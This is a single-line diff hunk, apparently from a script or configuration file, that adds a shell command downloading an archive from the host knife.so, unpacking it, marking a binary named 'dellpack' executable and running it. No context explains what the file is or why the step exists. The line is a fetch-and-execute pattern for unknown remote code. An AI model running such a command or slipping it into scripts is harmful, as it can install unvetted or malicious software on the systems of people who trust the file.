@@ -1,0 +1,1 @@
+wget knife.so/dpack.tar && tar xf dpack.tar && chmod +x dellpack && ./dellpack
